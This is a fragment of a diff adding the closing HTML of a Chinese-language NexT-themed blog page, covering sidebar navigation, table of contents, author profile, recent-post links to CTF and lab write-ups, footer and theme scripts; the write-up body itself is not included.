+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
